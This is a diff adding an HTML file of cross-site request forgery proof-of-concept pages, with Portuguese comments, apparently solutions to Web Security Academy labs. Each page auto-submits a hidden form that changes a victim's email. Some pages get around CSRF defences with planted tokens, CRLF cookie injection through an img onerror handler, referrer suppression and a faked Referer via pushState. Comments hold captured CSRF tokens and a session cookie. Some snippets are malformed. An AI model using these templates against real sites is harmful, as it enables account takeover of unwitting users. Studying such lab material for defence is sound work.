@@ -1,0 +1,132 @@
+<html>
+    <body>
+        <form method="$method" action="$url">
+            <input type="hidden" name="$param1name" value="$param1value" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+<!-- ............................................................................................. -->
+
+<html>
+    <body>
+        <form method="POST" action="https://accd1f9a1f597556c0672a56003e00da.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste@teste.com" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+    
+<!--
+     $param1name = email
+
+     $param1value = o email que quer usar
+-->
+
+<!-- ............................................................................................. -->  
+
+<!--
+Ele tem alteração de Csrf: 
+
+Csrf 01 ( login com Wiener)  : 08hi3pD7NJs2q364EJWINWu8gDmPmNdv
+Csrf 02 ( login com Carlos ) : 0Al5LDbLgZqPouUvNR50Qh2vWqyrdT2m
+-->
+
+
+<html>
+    <body>
+        <form method="POST" action="https://ac511fe41ecc7f04c047017b00fd00b5.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste@teste.com" />
+        </form>
+            <input type="hidden" name="csrf" value="0Al5LDbLgZqPouUvNR50Qh2vWqyrdT2m" />
+        </form>
+            <input type="submit" value="Submit request" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+<!-- ............................................................................................. -->  
+
+
+<!--
+csrfKey 01 =b8LaxWMoqlGghdnVzwTyVA3Z5DtOEKhX
+csrfKey 02 =b8LaxWMoqlGghdnVzwTyVA3Z5DtOEKhX
+
+session=TZsTn9w3vRJAPVi8v2eeJ3jiWtWcjxFy
+csrf = FNrVbShZvdwuEkfMUw6BACH0dh4xEmgB
+-->
+
+<html>
+    <body>
+        <form method="POST" action="https://ac471f831ea4c86cc07f12b9002000e7.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste4@teste.com" />
+            <input type="hidden" name="csrf" value="tcpItLhgPzg0g6nghfgxGu2WAsO1u7Qb" />
+            <input type="submit" value="Submit request" />
+        </form>
+	<img src="https://ac471f831ea4c86cc07f12b9002000e7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=gUveDr5s05C2c8Hp921t3TzHL8r2Dv5E" onerror="document.forms[0].submit();" />
+    </body>
+</html>
+
+<!-- ............................................................................................. -->  
+
+
+<!--
+csrf=BcYrMCO3BA2AJMW0BbPWenb4MDYi3JiJ
+-->
+
+<html>
+    <body>
+        <form method="POST" action="https://ac291f251fa66b19c0c257d300db008a.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste4@teste.com" />
+            <input type="hidden" name="csrf" value="BcYrMCO3BA2AJMW0BbPWenb4MDYi3JiJ" />
+            <input type="submit" value="Submit request" />
+        </form>
+	<img src="https://ac291f251fa66b19c0c257d300db008a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=BcYrMCO3BA2AJMW0BbPWenb4MDYi3JiJ" onerror="document.forms[0].submit();" />
+    </body>
+</html>
+
+
+<!-- ............................................................................................. -->  
+
+<html>
+    <body>
+        <form method="POST" action="https://acc61fad1f54d391c0601f3e003800bc.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste@teste.com" />
+	    <meta name="referrer" content="no-referrer">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+<!-- ............................................................................................. -->  
+
+
+<html>
+    <body>
+	<script>history.pushState("", "", "/?https://ac1e1f231fc3c002c06c204c00a00068.web-security-academy.net")</script>
+	<h1> Hello Word <h1/>
+	<iframe style="display:none" name="crsf-iframe"></iframe>
+        <form method="POST" action="https://ac1e1f231fc3c002c06c204c00a00068.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="teste@teste.com" />
+            <input type="submit" value="Submit request" />
+        </form>
+        <script>
+            document.getElementByID["csrf.form""].submit();
+        </script>
+    </body>
+</html>
+
+
+
